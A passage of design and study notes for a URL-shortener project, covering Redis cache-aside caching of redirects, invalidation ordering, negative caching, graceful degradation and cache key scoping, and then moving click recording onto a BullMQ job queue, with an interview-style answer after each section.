  all, under GDPR and similar regimes.
- **IP handling.** If a future phase adds IP-based geolocation to
  populate `country`, that raises its own questions (store the raw IP?
  for how long? hash/truncate it?) that this phase deliberately doesn't
  need to answer, since no IP is captured at all right now.
- **Anonymization.** No hashing, truncation, or aggregation of
  `user_agent`/`referrer` happens before storage — they're kept exactly
  as the request sent them.
- **Rate limiting on `/unlock`.** Not privacy-specific, but the same
  "deliberately deferred" category: nothing currently limits how many
  password guesses `POST /:shortCode/unlock` will accept — that's
  explicitly Phase 11's job, not this phase's. bcrypt's own cost factor
  slows each individual guess, but that's not a substitute for rate
  limiting against a sustained automated attempt.

**Interview answer.** Click recording stores `referrer` and `user_agent`
per click, both nullable to handle privacy-mode browsers or restrictive
referrer policies gracefully rather than erroring — but deliberately no
IP address at all; the schema's `country` column exists for a future
geolocation step, not for storing a raw IP now. Even without an account
attached, that combination can still fingerprint a device across clicks,
so a production version of this would need retention limits, consent
handling for regulated visitors, and a real answer for how (or whether)
IP gets involved once geolocation is added — none of which this phase
builds, along with rate limiting on the password-unlock endpoint, which
is an explicitly open gap until Phase 11.

---

## Phase 8: Caching the Redirect Path

### What makes data worth caching — and what in this app isn't

**What it is.** A cache trades a slower, authoritative read (Postgres) for
a faster, secondary copy (Redis) that can go stale. That trade is only
worth making for data that's read far more often than it changes, and
where a bounded amount of staleness is tolerable.

**Why it exists in this project.** `getLinkByShortCode` (Phase 7) is read
on literally every visit to a short link, but a given link's row changes
rarely — only on an owner's `PATCH`/`DELETE`, which is a low-frequency,
authenticated, low-volume operation compared to public redirect traffic.
That read-to-write ratio is what makes it a good caching candidate at all.

**How it works mechanically.** Not every field on that row is equally
cacheable, which is the whole reason Phase 8 exists as a design problem and
not just a mechanical "wrap it in Redis" exercise:

- `destination_url`, `password_hash`, `expires_at`, `is_active` — change
  only via an explicit owner action, invalidated explicitly on write (see
  "Invalidation ordering" below). Good caching candidates.
- `click_count` — changes on _every single click_, with no invalidation
  hook at all (see "The click_count problem" below). A bad caching
  candidate in the naive sense; this phase caches it anyway but bounds the
  damage with a much shorter TTL specifically because of this.
- Anything scoped to a user (e.g. a future cache of `listLinks`'s results)
  is a different category again — see "Key namespacing" below.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`getLinkByShortCode` and its private `getCachedLink`/`setCachedLink`/
`setCachedMiss`/`invalidateLinkCache` helpers.

**Common pitfalls.**

- Caching a whole row indiscriminately because "it's one query" without
  asking whether every field on it has the same staleness tolerance —
  `click_count` inside `RedirectLink` is exactly this trap, and is the
  reason this phase can't just be "cache the SELECT."
- Assuming a low read-to-write ratio disqualifies something from caching
  entirely, rather than asking whether a _shorter_ TTL still captures most
  of the benefit — see the click_count decision below.

**Production considerations.** As the app grows, other read-heavy,
write-light data becomes a candidate the same way — e.g. a future
`GET /api/links/:id` cache, which would need the user-scoping rule below
applied from day one, not retrofitted after a leak.

**Interview answer.** I picked `getLinkByShortCode` to cache because it's
read on every redirect but written only on an owner's occasional edit — a
large read-to-write ratio is the basic precondition for caching being
worth it at all. But not every field on that row shares that property:
`click_count` changes on every click, so I treated it as a separate
sub-problem rather than assuming the whole row was equally safe to cache.

---

### Cache-aside, step by step

**What it is.** Cache-aside (also called lazy loading) is a pattern where
the application, not the cache, owns the read/write logic: on a read, check
the cache first; on a miss, read the source of truth and populate the
cache; on a write, update the source of truth and then evict (or update)
the cache entry.

**Why it exists in this project.** Three other patterns exist and each
implies infrastructure this project doesn't have:

- **Read-through** — the cache itself, not the application, knows how to
  load from the source of truth on a miss (e.g. via a configured loader).
  This needs a caching layer that can talk to Postgres on its own; plain
  Redis can't, and standing up something that can (e.g. a caching proxy)
  would be infrastructure with no other use here.
- **Write-through** — every write goes to the cache first, which
  synchronously writes through to the source of truth. This makes the
  cache sit _in front of_ Postgres for writes, adding Redis to the
  critical path of every `PATCH`/`DELETE` even though those are already
  low-volume and not latency-sensitive — no benefit to justify the added
  dependency on that path.
- **Write-behind** — writes go to the cache and are asynchronously flushed
  to the source of truth later. This trades durability (a crash between
  the cache write and the flush loses data) for write latency, which isn't
  a problem this app has — `updateLink`/`deleteLink` are already fast,
  low-volume, single-row writes.

Cache-aside is the only one of the four that adds Redis purely as an
optional accelerant on the read path, with Postgres remaining fully
authoritative and reachable independent of Redis — which is exactly the
"graceful degradation" property this phase requires (see below).

**How it works mechanically.** `getLinkByShortCode`:

1. `getCachedLink(shortCode)` — GET `link:<shortCode>`. A hit (positive or
   negative-sentinel) returns immediately, no Postgres involved.
2. On a miss, `SELECT ... FROM links WHERE short_code = $1` against
   Postgres, same query as before this phase.
3. The result (found or not) is written back to Redis with an appropriate
   TTL, so the _next_ read is a cache hit.
4. `updateLink`/`deleteLink`/`createLink`'s custom-alias branch explicitly
   evict the entry on a write, rather than waiting for the TTL (see
   "Invalidation ordering" below) — the "aside" part of cache-aside: the
   application manages invalidation itself, the cache is otherwise passive.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`getLinkByShortCode` (the read path), `updateLink`/`deleteLink`/`createLink`
(the write paths that call `invalidateLinkCache`).

**Common pitfalls.**

- Reaching for read-through/write-through by default because they sound
  more "automatic" — both require infrastructure (a smart cache or a
  cache sitting in the write path) this app has no other reason to run.
- Forgetting that cache-aside puts invalidation correctness entirely on
  the application — unlike write-through, nothing enforces that a write
  and a cache update happen together; that discipline has to be built in
  by hand (see "Invalidation ordering").

**Production considerations.** At much higher write volume, write-through
or write-behind's tradeoffs (added write latency vs. eventual durability)
start to matter more — neither applies today given how infrequent
`PATCH`/`DELETE` are relative to redirect traffic.

**Interview answer.** I used cache-aside because it's the only one of the
four core caching patterns that keeps Redis purely optional on the read
path — Postgres stays fully authoritative and reachable with Redis
completely absent, which is what let me build graceful degradation as a
first-class requirement rather than an afterthought. Read-through and
write-through both need Redis to sit _in_ a critical path (a smart loader,
or the write path itself); write-behind trades durability for write
latency this app doesn't need, since writes here are already fast and rare.

---

### The click_count problem

**What it is.** `links.click_count` is a denormalized counter (Phase 7)
incremented by `recordClick` on every single redirect. `deadStateError`
compares it against `max_clicks` to decide whether a link has hit its
limit. Caching `RedirectLink` naively would cache this value too — but
nothing re-populates the cache when `recordClick` increments it, so a
cached `click_count` is frozen for the entire life of its TTL.

**Why it exists in this project.** Four options were on the table, with
very different worst-case behavior:

| Option                                                                           | Worst-case overshoot past `maxClicks`                         | Caching benefit for capped links     |
| -------------------------------------------------------------------------------- | ------------------------------------------------------------- | ------------------------------------ |
| (a) never cache `click_count`; read it separately from Postgres on every request | none                                                          | none — still a DB read every request |
| (b) cache the whole row with the normal 300s TTL                                 | unbounded by however much traffic arrives within 300s         | full                                 |
| (c) never cache links that have `maxClicks` set at all                           | none                                                          | none                                 |
| (d) cache capped links too, but with a much shorter TTL                          | bounded by however much traffic arrives within that short TTL | most of it                           |

(c) was the first instinct — exclude the risky case entirely — but it's
the wrong trade: a link only _has_ a click cap because its owner expects
meaningful volume, so (c) excludes from caching exactly the links most
likely to be hot. (d) was chosen instead: capped links are cached like any
other link, but with `LINK_CACHE_CAPPED_TTL_SECONDS = 5` instead of the
usual 300. This isn't really a "concurrency race" — it's structural: a
cache entry is always written with the `click_count` read _before_ that
same request's own `recordClick` call runs, so even a single next request
landing within the 5s window sees a value that doesn't yet reflect the
request(s) already served since. A 5-second window bounds that overshoot
to "however many clicks arrive in 5 seconds" instead of "however many
arrive in 5 minutes" — for all but the most viral links, a handful of
clicks at worst, self-correcting on the very next cache miss.

**How it works mechanically.** `getLinkByShortCode` picks the TTL based on
`link.maxClicks === null ? LINK_CACHE_TTL_SECONDS : LINK_CACHE_CAPPED_TTL_SECONDS`
right before caching a positive result. Nothing else about the code path
differs — `deadStateError` in `src/routes/redirect.ts` evaluates whatever
`RedirectLink` it's handed exactly the same way whether it came from
Postgres or Redis; it has no idea caching exists.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`LINK_CACHE_CAPPED_TTL_SECONDS`, and the TTL-selection line inside
`getLinkByShortCode`. Proven directly in
`tests/routes/redirect.test.ts`, `describe('response caching (Redis)')` —
one test asserts the capped TTL via `redis.ttl`, another walks through the
accepted one-request overshoot and its self-correction after the TTL
expires. The original Phase 7 test
(`'returns 410 once click_count reaches maxClicks'`) was updated to wait
out the capped TTL before asserting 410, since it previously encoded a
stricter immediate-enforcement guarantee that caching deliberately no
longer makes.

**Common pitfalls.**

- Treating "cache it or don't" as a binary choice — the actually useful
  lever here was the TTL, not the yes/no decision.
- Assuming the overshoot is a concurrency bug to be "fixed" with locking —
  it's a deliberate, bounded, and self-correcting tradeoff, not a defect.

**Production considerations.** **What would flip this back to option
(a):** if a click cap ever acquires billing or legal significance — a paid
tier enforced by click count, or a contractual "this link stops working at
exactly N clicks" guarantee — a few seconds of possible overshoot stops
being acceptable. At that point `click_count` should go back to an
uncached, per-request Postgres read for capped links specifically (or move
enforcement server-side into an atomic Redis counter/Lua script rather
than a lazy read at all). Today it's a display/soft-limit counter with no
such stakes.

**Interview answer.** The core tension is that `click_count` changes on
every request but nothing invalidates its cache entry when that happens —
so any cached value is stale the instant it's written. My first instinct
was to just never cache links with a click cap, but that's backwards:
those are exactly the links most likely to get real traffic, since an
owner only sets a cap when they expect volume. Instead I cache them with a
5-second TTL instead of the normal 5 minutes, which bounds the possible
overshoot to "clicks that arrive in 5 seconds" rather than an open-ended
window, while still capturing most of the caching benefit. If click
enforcement ever became a hard boundary — billing, contractual limits — I'd
go back to an uncached read for that specific case, because a few seconds
of slack stops being acceptable once real stakes are attached to it.

---

### Invalidation ordering: write, then invalidate

**What it is.** When a write and a cache invalidation both need to happen,
there are two possible orderings — invalidate the cache first, then write
the database; or write the database first, then invalidate the cache —
and they are not equivalent.

**Why it exists in this project.** `updateLink`/`deleteLink` both write to
Postgres and need `link:<shortCode>` gone from Redis afterward.
Invalidate-then-write has a real race: a concurrent `GET /:shortCode`
landing between the delete and the write finds no cache entry, reads
Postgres (still the _old_ value, since the write hasn't landed yet), and
re-populates the cache with that old value — and nothing will ever
invalidate it again until its own TTL expires naturally. That's strictly
worse than doing nothing: a stale entry that outlives the very fix meant
to remove it. Write-then-invalidate's race window is bounded instead: a
concurrent read landing between the write and the delete gets one stale
response, and the very next request after the delete completes is
guaranteed fresh.

**How it works mechanically.** `updateLink` runs its `UPDATE ... RETURNING`
first, then calls `invalidateLinkCache(row.short_code)` before building
and returning the `Link`. `deleteLink` runs `DELETE ... RETURNING id,
short_code` first, then invalidates using the returned `short_code` before
returning `true`. Both invalidate unconditionally, even for a link that
was never cached (a capped link, say) — a `DEL` on an absent key is a
harmless no-op, simpler than branching on whether caching would have
applied.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`updateLink`, `deleteLink`, and `invalidateLinkCache`'s doc comment, which
spells out the race being avoided. Proven in
`tests/routes/redirect.test.ts`: the PATCH/DELETE invalidation tests
assert `redis.get` is `null` _immediately_ after the write, not just that
a later request happens to see fresh data.

**Common pitfalls.**

- Invalidating before the write "to be safe" — this is the exact ordering
  that produces a permanently stale entry under a concurrent read, not a
  safer one.
- Assuming the race is purely theoretical — it only requires one read to
  land in a narrow window between two Redis/Postgres calls under real
  concurrent traffic, which this app's own redirect volume is specifically
  expected to have.

**Production considerations.** At higher write concurrency on the _same_
link (multiple simultaneous edits), the invalidation call itself is still
just a `DEL` — idempotent and order-independent between concurrent
writers, so this doesn't need additional locking even then.

**Interview answer.** I invalidate after the database write commits, never
before, because invalidate-then-write has a race that leaves a stale cache
entry with no way to ever get fixed: a concurrent read can slip in between
the delete and the write, see the old data in Postgres, and re-cache it —
at which point nothing will invalidate that entry again until its TTL
expires on its own. Write-then-invalidate has a race too, but a strictly
smaller one: a read in that narrow window gets one stale response, and the
very next request is guaranteed correct once the delete lands.

---

### TTL as a safety net, not the primary mechanism

**What it is.** This cache has two invalidation mechanisms doing different
jobs: explicit `DEL` calls on every write (the primary mechanism, correct
immediately), and a TTL on every entry (a fallback that bounds staleness
even when explicit invalidation doesn't happen).

**Why it exists in this project.** Explicit invalidation can fail to run:
`invalidateLinkCache`'s own `DEL` can fail if Redis is unreachable at the
exact moment of a `PATCH`/`DELETE` (see "Graceful degradation" below,
which requires that failure not fail the request). If that happens, the
stale entry left behind has no other trigger to remove it — except its
TTL. The TTL isn't there to make invalidation unnecessary; it's there to
guarantee an upper bound on staleness even in the case explicit
invalidation was designed to handle but couldn't, for a reason outside the
application's control.

**How it works mechanically.** Every `SET` in this cache carries an `EX`
TTL — 300s for uncapped links, 5s for capped links, 30s for negative
entries. `invalidateLinkCache`'s `catch` block logs
`'Redis DEL failed while invalidating link cache; stale entry may persist
until TTL expiry'` specifically so a Redis outage during an edit is
diagnosable after the fact, even though the request itself succeeded.

**Where it lives in the codebase.** `src/services/linkService.ts` — every
`redis.set(...)` call includes an `EX` argument; `invalidateLinkCache`'s
catch block and its accompanying comment.

**Common pitfalls.**

- Treating a long TTL as an acceptable substitute for explicit
  invalidation because "it'll expire eventually" — the whole point of
  building invalidation was to make edits visible immediately, not to make
  a long staleness window tolerable.
- Forgetting to log a failed invalidation, which would make a rare "why is
  this link still showing the old destination" report undiagnosable.

**Production considerations.** If Redis outages during writes become
frequent enough that TTL-bounded staleness starts mattering operationally,
that's a signal to page on the `'Redis DEL failed...'` log line
specifically, rather than to shorten every TTL globally.

**Interview answer.** Explicit invalidation is what makes edits visible
immediately — that's the part users actually experience. The TTL exists
for the case explicit invalidation can't cover: if Redis itself is down at
the exact moment of an edit, the `DEL` call fails, gets logged, and the
request still succeeds (it must — see graceful degradation) — but that
leaves a stale entry with nothing else to clean it up except its TTL. So
the TTL isn't a substitute for invalidation, it's the bound on how bad
things get on the specific path where invalidation itself failed.

---

### Negative caching

**What it is.** Caching the _absence_ of a resource — a nonexistent short
code — so a repeated lookup for the same missing key doesn't hit Postgres
every time either.

**Why it exists in this project.** `GET /:shortCode` is a public,
unauthenticated route reachable by anyone, including automated scanners
enumerating or guessing short codes. Without negative caching, every
single guess — valid or not — costs a Postgres round trip. With it, only
the first guess for a given code does.

**How it works mechanically.** A miss is stored at the _same_ key
(`link:<shortCode>`) as a hit would use, with the sentinel value
`'__MISS__'` instead of a serialized link — one `GET` distinguishes all
three states (absent from cache / negative hit / positive hit) with no
second key or round trip. Its TTL (`LINK_CACHE_NEGATIVE_TTL_SECONDS = 30`)
is deliberately much shorter than the positive TTL: it bounds how long a
short code can stay invisible if it was probed moments before being
claimed. That bound matters because nothing else invalidates a negative
entry when the code stops being "nonexistent" — `createLink` has no
inherent hook into a lookup cache it doesn't know about. The custom-alias
branch of `createLink` closes this for its own case explicitly, calling
`invalidateLinkCache(shortCode)` right after a successful insert — the
30s TTL is deliberately not the only mechanism there, just the fallback.
The generated-code path doesn't get the same treatment: with 62^7 possible
codes, a fresh random code being pre-probed within a 30-second window
before it's ever generated isn't a realistic scenario worth an extra
Redis call on every signup.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`LINK_CACHE_MISS_SENTINEL`, `setCachedMiss`, the `getCachedLink` branch
that returns `{found: true, link: null}`, and the `invalidateLinkCache`
call inside `createLink`'s custom-alias branch.

**Common pitfalls.**

- Giving negative entries the same TTL as positive ones — a nonexistent
  code is much more likely to _become_ real (via creation) than an
  existing link's destination is to silently change without going through
  `PATCH`, so the tolerable staleness window is genuinely different.
- Assuming the negative-cache TTL alone is sufficient and skipping the
  `createLink` invalidation — for the realistic case (custom aliases,
  which are guessable/memorable and thus more likely to be pre-probed)
  that leaves an avoidable window of a link 404ing right after its own
  creation.

**Production considerations.** At real scale, negative caching also
meaningfully reduces the load a scanning/enumeration attempt puts on
Postgres — the _first_ request for a given nonexistent code still pays a
full lookup, but a sustained scan of the same handful of codes doesn't
repeat that cost.

**Interview answer.** I cache misses too, using a sentinel value at the
same key a hit would use, so a single `GET` covers all three outcomes with
no extra round trip. The tradeoff is that a link can 404 for up to the
negative TTL if its exact code was probed right before creation — I keep
that TTL short (30s) specifically to bound that window, and for the
realistic case (a custom alias, since those are guessable) I close it
entirely by having `createLink` invalidate the negative entry the moment
the alias is actually claimed.

---

### Graceful degradation: a cache that can fail must never fail the request

**What it is.** Every Redis operation on this path — `GET`, `SET`, `DEL`
— is wrapped so an error is caught, logged, and treated as "proceed as if
the cache weren't there," never allowed to propagate and fail the
request.

**Why it exists in this project.** A cache is, by definition, an optional
accelerant over a source of truth that already works on its own. If a
caching layer's failure could fail requests that would have succeeded
without it, adding the cache would have made the system _less_ reliable
than having no cache at all — trading a fast path that sometimes helps for
a new way the whole system can go down. That's the opposite of what
caching is supposed to buy.

**How it works mechanically.** `getCachedLink` catches any error from
`redis.get` and returns `{found: false}` — indistinguishable, from
`getLinkByShortCode`'s perspective, from a genuine cache miss, so
execution falls straight through to the existing Postgres query.
`setCachedLink`/`setCachedMiss` catch errors from `redis.set` and simply
don't cache that lookup — the response the caller already has is
unaffected. `invalidateLinkCache` catches errors from `redis.del` — see
"TTL as a safety net" above for what that specifically trades away. Each
catch block logs via `logger.error` so a real Redis outage is visible in
aggregate, even though no individual request fails because of it.

This is a deliberate divergence from `oauthState.ts`'s `storeState`/
`consumeState`, which do _not_ catch Redis errors — and that's correct
there, not an oversight here. Redis is the actual source of truth for
OAuth state (there's no Postgres fallback for "is this CSRF token valid");
a failed state store or lookup should fail that request, because
proceeding without it would mean skipping a real security check. Here,
Redis is purely a performance layer over a Postgres query that already
returns a correct answer on its own — the two modules have genuinely
different reliability requirements, not just an inconsistent style.

**Where it lives in the codebase.** `src/services/linkService.ts` — every
`try`/`catch` inside `getCachedLink`/`setCachedLink`/`setCachedMiss`/
`invalidateLinkCache`. Proven directly in
`tests/routes/redirect.test.ts`'s `describe('response caching (Redis)')`:
three tests use `vi.spyOn(redis, 'get'|'set'|'del').mockRejectedValueOnce`
to simulate a live Redis failure on each operation and assert the request
still succeeds. Manually confirmed too: stopping the local Redis container
(`docker compose stop redis`) and issuing a redirect still returned 302.

**Common pitfalls.**

- Letting a cache-layer error propagate "because it should never happen in
  practice" — a caching layer that can silently take down an
  already-working code path on a transient network blip is a regression,
  not a resilience improvement.
- Catching the error but forgetting to log it — an unlogged Redis outage
  degrades performance invisibly, discoverable only much later via a low
  hit rate with no obvious cause.

**Production considerations.** At real scale, a sustained Redis outage
under this design degrades to "every redirect pays the full Postgres
lookup cost" — worse latency, but a fully functional system, which is the
entire point.

**Interview answer.** Every Redis call on this path is wrapped so a
failure logs and falls through to Postgres rather than failing the
request — because a cache is supposed to be optional, and a cache that can
take down an already-working code path on a transient failure would make
the system less reliable than having no cache at all. I deliberately did
this differently from the existing `oauthState.ts` module, which lets
Redis errors propagate — that's correct there because Redis _is_ the
source of truth for OAuth state with no fallback, so a failure there
should fail the request. Here Redis is purely a performance layer over a
Postgres query that's already correct on its own, so the two modules have
genuinely different failure requirements.

---

### Cache stampede

**What it is.** A stampede happens when a popular cache entry expires (or
is evicted) and a burst of concurrent requests all miss at once, each
independently hitting the source of truth simultaneously — turning one
slow query into many.

**Why it exists in this project — or rather, doesn't, yet.** No stampede
mitigation (single-flight locking, probabilistic early expiration,
stale-while-revalidate) is implemented this phase. At this app's actual
scale — a single API process talking directly to a local/managed Postgres
instance that comfortably handles individual lookups — the failure mode a
stampede protects against (many _simultaneous_ first-touch requests for
the _same_ key, arriving in the same instant a TTL lapses) isn't a
realistic problem yet. Adding locking or coordination for a scenario that
isn't happening would be complexity with no measured benefit.

**How it works mechanically.** Nothing — a TTL expiry today just means the
next request (or requests, if several arrive close together) each
independently miss and each independently re-populate the cache with the
same value. Redundant work, but bounded and self-correcting, not a
correctness problem.

**Where it lives in the codebase.** Nowhere — this is a deliberate
non-implementation, not an oversight.

**Common pitfalls.**

- Building stampede protection preemptively "because it's a known caching
  problem" without a concrete scenario where it's actually biting — that's
  solving a problem this app doesn't have yet at the cost of real
  complexity (coordination logic, an extra failure mode of its own).

**Production considerations.** The trigger that would change this answer:
a single link receiving enough concurrent first-touch traffic within one
TTL window (a link going viral, essentially) that the redundant Postgres
reads during that burst become a measurable load problem — at that point,
a short single-flight lock (e.g. a Redis `SETNX`-based mutex around the
Postgres read) or stale-while-revalidate (serve the expiring value while
one request refreshes it in the background) would be the next step, not
before.

**Interview answer.** I didn't implement stampede protection — no
locking, no probabilistic early expiration — because at this app's actual
traffic level, many concurrent requests missing the cache for the exact
same key in the exact same instant isn't a real scenario yet; a TTL
lapsing just means a request or two redundantly re-populates the cache,
which is bounded and self-correcting. I'd revisit this the moment a single
link's traffic within one TTL window makes those redundant Postgres reads
a measurable cost, not before — building the coordination for it earlier
would be complexity without a problem to justify it.

---

### Key namespacing

**What it is.** `link:<shortCode>` follows the same flat
`<namespace>:<identifier>` convention `oauthState.ts` already established
with `oauth:state:<state>`.

**Why it exists in this project.** `getLinkByShortCode` is deliberately
the one _unscoped_ lookup in `linkService.ts` (Phase 7) — there's no
authenticated user to scope it by, since the redirect route is public.
`link:<shortCode>` mirrors that: no user id in the key, because the data
behind it isn't user-scoped either.

**How it works mechanically.** `linkCacheKey(shortCode)` builds
`` `link:${shortCode}` `` — nothing else goes into the key.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`linkCacheKey` and `LINK_CACHE_PREFIX`.

**Common pitfalls — and the rule this sets up for later.** The critical
rule for _any future cache over user-owned data_ is that the user id must
be part of the key, not just a filter applied after reading a shared
cache entry. Concretely: if a future phase caches `getLink(userId,
linkId)` (the owner-scoped lookup, distinct from this one) and keys it as
just `link-by-id:<linkId>` — omitting `userId` — then user A's request for
`linkId` populates a cache entry that user B's request for the _same_
`linkId` (if B ever guessed or was given that id) would also read, because
nothing about the key itself encodes whose request it was. The fix isn't
an application-level ownership check after the cache read (that's exactly
the "if-statement instead of the query" mistake this codebase's own
conventions already forbid for Postgres queries — see this file's
"Conventions" section) — it's `` `link-by-id:${userId}:${linkId}` ``, so a
cache hit is structurally impossible unless the requesting user matches
the one whose request created the entry. `link:<shortCode>` gets to skip
this because `getLinkByShortCode` itself has no owner to scope by in the
first place — this is the one deliberate exception, not the general rule.

**Production considerations.** This is the same class of bug as a missing
`WHERE user_id = $2` on a Postgres query, just relocated to Redis — and
just as serious, since a cache is exactly as capable of leaking
cross-tenant data as a database is if it isn't scoped correctly.

**Interview answer.** The redirect cache key is deliberately unscoped —
just `link:<shortCode>` — because the function it caches,
`getLinkByShortCode`, is itself the one deliberately public, unscoped
lookup in this codebase; there's no user id to include because there's no
authenticated user in the request at all. But that's specifically because
this data has no owner-scoping requirement to begin with — any _future_
cache over owner-scoped data would need the user id baked directly into
the key, not checked after the fact, for the same reason every Postgres
query in this codebase scopes ownership in the `WHERE` clause instead of
an `if` statement: a cache entry keyed without the user id is exactly as
capable of serving user A's cached data to user B as a query missing
`AND user_id = $2` is.

---

### Measuring cache effectiveness

**What it is.** Two separate measurements: raw latency (is a cache hit
actually faster than a cache miss, and by how much) and hit rate (in
steady-state traffic, how often is the cache actually being used).

**Why it exists in this project.** Building a cache without measuring it
is exactly the mistake Phase 7 avoided with `recordClick`'s benchmark —
optimizing before measuring means never actually knowing whether the
change made a meaningful difference.

**How it works mechanically.** A throwaway local script (following Phase
7's own precedent — `recordClick`'s `withTransaction` benchmark helper was
written, used once, and deleted afterward, not kept as unused
infrastructure) called `getLinkByShortCode` directly, isolating it with
`process.hrtime.bigint()` the same way `recordClick` was isolated: 300
iterations after a 20-iteration warmup, median latency, once with the
cache forcibly cleared before every call (cold — Postgres read + cache
populate every time) and once with the cache pre-populated (warm — every
call a cache hit).

**Results, against local Postgres and local Redis over loopback:**

| Path                                              | Median latency (n=300) |
| ------------------------------------------------- | ---------------------- |
| Cold (cache miss: Postgres read + cache populate) | **~0.569ms**           |
| Warm (cache hit: single Redis `GET`)              | **~0.169ms**           |

A warm lookup is roughly **3.4x faster** than a cold one locally — a
~0.4ms absolute improvement on top of Phase 7's ~1.7ms measured end-to-end
redirect baseline. That's real, but it understates the production case
significantly: `links.short_code` is already a unique, indexed column, so
the _local_ Postgres lookup this replaces is already about as cheap as a
single-row indexed read gets, over near-zero loopback latency. Against a
network-attached production database (real round-trip time replacing
loopback), the Postgres side of that comparison gets meaningfully more
expensive while the Redis side — typically also network-attached, but a
simpler single-key `GET` — stays comparatively cheap; the _relative_
benefit of a cache hit should be expected to grow, not shrink, once real
network RTT is involved on both sides.

For hit rate: every cache lookup logs at debug level via `logger.debug`
with `{shortCode, cache: 'hit' | 'miss' | 'negative-hit'}` and a single
consistent message (`'Link cache lookup'`), so hit rate is derivable by
counting log lines grouped by that field in a log aggregator — no new
metrics dependency (e.g. `prom-client`) was added for this, consistent
with this project's rule against silently adding dependencies.

**Where it lives in the codebase.** The benchmark script itself was
deleted after this measurement (`scripts/benchmarkLinkCache.ts`, no longer
present) — the numbers above are the artifact that matters, not the
script. The debug logging lives in `getCachedLink` in
`src/services/linkService.ts`.

**Common pitfalls.**

- Trusting the local benchmark's absolute numbers as representative of
  production — the ratio is informative, the absolute milliseconds
  measured over loopback are not.
- Keeping a one-off benchmark script around as permanent infrastructure
  nothing else calls, rather than recording its output and deleting it.

**Production considerations.** A _low_ hit rate in production logs would
mean one of a few things worth investigating in order: TTLs set too short
for actual traffic patterns (unlikely here given 300s for the common
case), traffic spread across a very large number of distinct, rarely
repeated short codes (a link-sharing pattern where most links get one or
two clicks total, in which case caching has genuinely limited headroom no
matter the TTL), or — worth checking first, since it's cheap to rule
out — Redis itself intermittently failing and silently falling back to
Postgres on every request (see "Graceful degradation" above), which would
look like a low hit rate but is actually an outage that needs fixing, not
a caching-strategy problem.

**Interview answer.** I measured cold-vs-warm latency locally the same
way Phase 7 measured `recordClick` — an isolated, throwaway benchmark, 300
iterations after warmup, median latency — and got about 0.57ms cold versus
0.17ms warm, roughly a 3.4x improvement. But I called that number out as
an underestimate of the real-world benefit: the local Postgres lookup
here is already an indexed single-row read over loopback, about as cheap
as that operation gets, so the comparison is stacked against caching
looking impressive. Against a network-attached production database, the
Postgres side gets meaningfully slower while the Redis side stays roughly
as cheap, so the relative benefit should grow, not shrink. For hit rate in
production, I didn't add a metrics library — every cache lookup logs a
consistent, structured debug line, so hit rate is derivable from log
aggregation alone, and a low hit rate would point me first at whether
Redis itself is silently failing before I'd assume it's a TTL-tuning
problem.

---

## Phase 9: Background Jobs

### Queues vs. fire-and-forget: durability, retries, backpressure

**What it is.** A job queue is durable, ordered (per-queue) storage for
units of work, decoupled from whoever produces them and whoever consumes
them — the opposite of an unawaited promise (`recordClick(...)` fired
without `await` and forgotten), which is just a background task with no
storage, no retry, and no record it ever existed once it starts running.

**Why it exists in this project.** Phase 7 kept click recording
synchronous specifically to measure its real cost before this phase moved
it off the request path — the measurement (see "Measuring the redirect
path" below) confirmed there was real latency to reclaim, but reclaiming
it was never the main argument for a queue. An unawaited `recordClick(...)`
would reclaim the same latency with three concrete costs a queue doesn't
have:

1. **Durability.** An unawaited promise's only record of existing is the
   in-memory call stack of the process running it. A crash, a redeploy, or
   an unhandled rejection between "fired" and "written" loses the click
   silently — nothing persisted it anywhere first. A BullMQ job is written
   to Redis _before_ anything attempts to process it; a crash after that
   point loses nothing, because the job is still sitting in Redis for
   whichever worker comes back online to pick up.
2. **Retries.** An unawaited promise that throws just throws — into an
   `unhandledRejection` handler if one exists, or crashes the process if
   not. There's no built-in notion of "try again," let alone "try again
   with backoff." A transient Postgres blip (a restart, a brief
   connection-pool exhaustion) permanently loses every click that happened
   to land in that window. BullMQ retries a failed job automatically, per
   its configured `attempts`/`backoff` (see "Retries, backoff, and job
   retention" below).
3. **Backpressure.** Nothing bounds how many unawaited promises can be
   in flight at once — under a traffic spike, or a slow Postgres, the
   number of concurrently-running `recordClick` calls grows with request
   volume, each holding its own connection attempt, with no visibility
   into how far behind the system has fallen until something falls over
   (connection pool exhaustion, memory pressure from accumulated promises).
   A queue makes the backlog a first-class, inspectable number — _queue
   depth_ (see "Observability" below) — and the worker's own bounded
   concurrency (see "Bounded concurrency" below) means a traffic spike
   grows the queue, not the number of concurrent Postgres connections the
   worker attempts to open.

**How it works mechanically.** The redirect enqueues a job
(`enqueueClick`, `src/queues/clickQueue.ts`) instead of writing directly;
a separate `worker/` process consumes it (`worker/index.ts`), running
`processClickJob` (`worker/processors/clickProcessor.ts`) against its own
Postgres connection. Producer and consumer never call each other directly
— they communicate only through Redis, via BullMQ's `Queue`/`Worker`
primitives.

**Where it lives in the codebase.** `src/queues/clickQueue.ts`
(`enqueueClick`); `src/routes/redirect.ts` (the call site);
`worker/processors/clickProcessor.ts` (`processClickJob`); `worker/
index.ts` (wires the `Worker` that calls it).

**Common pitfalls.**

- Reaching for a queue by default for _any_ background work, without
  asking whether the three properties above actually matter for this
  specific task — a queue is real infrastructure (Redis as a dependency,
  a second deployable, retry/idempotency design work) and isn't free just
  because "async is good."
- Assuming an unawaited promise and a queue job are interchangeable
  because both "run later" — they differ specifically in what survives a
  crash, not in when the work happens.

**Production considerations.** At higher traffic, the backpressure
property becomes the most operationally important of the three: a
transient click-volume spike (a link goes viral) grows queue depth, a
visible, alertable number, rather than silently degrading redirect
latency or exhausting the API process's own resources — the redirect
path stays fast and isolated from however far behind click-processing has
fallen.

**Interview answer.** I moved click recording off the request path onto a
BullMQ queue rather than just firing an unawaited promise, for three
specific reasons: durability (a job persists in Redis before anything
tries to process it, so a crash mid-processing doesn't lose it — an
unawaited promise has no such record), retries (BullMQ retries a failed
job with backoff automatically; a bare unawaited call just throws into the
void on a transient Postgres blip), and backpressure (queue depth is a
real, inspectable number that grows under load instead of silently
piling up in-process memory or connection attempts). The latency
reclaimed by moving the write off the request path was real but
secondary — I'd measured it was worth reclaiming, but durability and
retries are the actual reasons a queue, not just an unawaited call.

---

### How BullMQ uses Redis, and why a naive queue is unsafe

